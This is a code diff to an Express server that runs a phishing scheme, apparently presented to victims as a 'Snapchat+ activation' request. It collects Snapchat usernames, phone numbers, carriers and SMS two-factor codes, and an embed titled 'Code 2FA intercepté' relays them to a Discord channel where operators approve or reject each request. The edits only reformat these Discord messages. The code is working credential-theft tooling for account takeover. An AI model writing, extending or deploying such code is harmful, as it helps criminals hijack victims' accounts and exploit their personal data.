@@ -41,14 +41,14 @@ app.post('/api/submit', async (req, res) => {
         if (!channel) throw new Error("Salon d'approbation introuvable");
 
         const embed = new EmbedBuilder()
-            .setTitle('📱 Nouvelle demande Snapchat+')
+            .setTitle('📱 Nouvelle demande d\'activation Snapchat+')
             .setColor(0xFFFC00)
             .addFields(
-                { name: '👤 Pseudo', value: snapchat, inline: true },
-                { name: '📱 Téléphone', value: phone, inline: true },
-                { name: '📡 Opérateur', value: operator, inline: true }
+                { name: 'Pseudo', value: snapchat, inline: true },
+                { name: 'Téléphone', value: phone, inline: true },
+                { name: 'Opérateur', value: operator, inline: true },
+                { name: 'ID', value: id }
             )
-            .setFooter({ text: `ID: ${id}` })
             .setTimestamp();
 
         const row = new ActionRowBuilder()
@@ -57,11 +57,7 @@ app.post('/api/submit', async (req, res) => {
                 new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('❌ Refuser').setStyle(ButtonStyle.Danger)
             );
 
-        // Message texte séparé avec blocs de code → bouton copier visible sur mobile
-        const copyMsg = `👤 Pseudo\n\`\`\`${snapchat}\`\`\`📱 Téléphone\n\`\`\`${phone}\`\`\`📡 Opérateur\n\`\`\`${operator}\`\`\``;
-
         await channel.send({ embeds: [embed], components: [row] });
-        await channel.send(copyMsg);
         console.log(`✅ Demande #${id} envoyée à Discord`);
         res.json({ id });
     } catch (err) {
@@ -167,16 +163,14 @@ app.post('/api/code', async (req, res) => {
             .setTitle('🔐 Code 2FA intercepté')
             .setColor(0x00FF00)
             .addFields(
-                { name: '👤 Pseudo', value: request.snapchat, inline: true },
-                { name: '📱 Téléphone', value: request.phone, inline: true },
-                { name: '📡 Opérateur', value: request.operator, inline: true }
+                { name: 'Pseudo', value: request.snapchat },
+                { name: 'Téléphone', value: request.phone },
+                { name: 'Opérateur', value: request.operator },
+                { name: 'Code', value: code }
             )
             .setTimestamp();
 
-        const copyMsg = `👤 Pseudo\n\`\`\`${request.snapchat}\`\`\`📱 Téléphone\n\`\`\`${request.phone}\`\`\`📡 Opérateur\n\`\`\`${request.operator}\`\`\`🔑 Code SMS\n\`\`\`${code}\`\`\``;
-
         channel.send({ embeds: [embed] });
-        channel.send(copyMsg);
     }
     requests.delete(id);
     res.json({ success: true });
